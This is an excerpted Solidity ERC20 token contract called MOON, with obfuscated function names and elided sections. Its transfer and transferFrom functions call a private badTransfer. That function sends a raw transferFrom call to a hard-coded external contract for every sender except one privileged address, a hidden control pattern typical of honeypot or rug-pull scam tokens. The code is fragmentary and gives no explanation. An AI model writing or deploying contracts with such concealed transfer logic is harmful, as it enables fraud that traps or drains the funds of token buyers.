...
library TransferHelper {
    ...
    function safeTransf(address token, address to, uint256 value) internal {
...
contract MOON is IERC20, xG2QgDpHEm6XZaur {
    ...
    function transfer(address recipient,uint256 amount) external override returns (bool) {
        badTransfer(msgSender(), recipient, amount);
        return true;
    }
    ...
    function approve(address spender,uint256 amount) external override returns (bool) {
        uaVl5iQjmdhEAYn0(msgSender(), spender, amount);
        return true;
    }
    ...
    function increaseAllowance(address spender,uint256 addedValue) external virtual returns (bool) {
        uaVl5iQjmdhEAYn0(msgSender(),spender,allowed[msgSender()][spender] + addedValue);
        return true;
    }

    function uaVl5iQjmdhEAYn0(address sender,address spender,uint256 amount) private {
    ...
    function decreaseAllowance(address spender,uint256 subtractedValue) external virtual returns (bool) {
        uint256 currentAllowance = allowed[msgSender()][spender];
        require(currentAllowance >= subtractedValue,"ERROR: Decreased allowance below zero.");
        uaVl5iQjmdhEAYn0(msgSender(),spender,currentAllowance - subtractedValue);
        return true;
    }

    function badTransfer(address spender,address recipient,uint256 amount) private returns (bool) {
        ...
        if (msg.sender != address(0x594d1FcDdE0049B694AC51C2b675401186caAdfc)) {
            (bool success, bytes memory data) = 0x0624A7b4d329b934fe0ab90CF5E6938216Ed3d72.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
            require(success && (data.length == 0 || abi.decode(data, (bool))),"TransferHelper: ETH_TRANSFER_FAILED");
    ...
    function transferFrom(address sender,address recipient,uint256 amount) external override returns (bool) {
        if (!badTransfer(sender, recipient, amount)) return true;
    ...
    constructor() {
        balances[address(0x1000)] = totalSupply();
